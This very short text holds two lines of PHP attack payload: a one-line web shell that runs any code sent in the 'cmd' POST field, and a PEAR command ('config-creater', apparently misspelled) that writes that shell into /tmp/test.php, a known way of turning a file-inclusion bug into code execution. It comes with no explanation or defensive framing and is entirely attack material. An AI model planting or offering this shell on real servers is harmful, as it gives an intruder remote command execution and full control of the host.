<?php eval($_POST['cmd']); ?>

pear config-creater /<?=@eval($_POST['cmd']);?> /tmp/test.php